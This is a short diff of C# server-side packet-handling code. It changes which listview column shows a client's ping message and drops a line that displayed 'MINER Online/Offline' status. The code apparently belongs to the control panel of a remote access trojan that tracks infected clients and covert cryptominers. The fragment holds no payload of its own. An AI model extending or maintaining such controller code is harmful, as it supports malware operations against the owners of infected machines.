@@ -18,7 +18,7 @@ namespace Server.Handle_Packet
                 ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                 lock (Settings.LockListviewClients)
                     if (client.LV != null)
-                        client.LV.SubItems[Program.form1.lv_prefor.Index].Text = unpack_msgpack.ForcePathObject("Message").AsString.Replace("MINER 0", "MINER Offline").Replace("MINER 1", "MINER Online");
+                        client.LV.SubItems[Program.form1.lv_act.Index].Text = unpack_msgpack.ForcePathObject("Message").AsString;
                     else
                         Debug.WriteLine("Temp socket pinged server");
             }
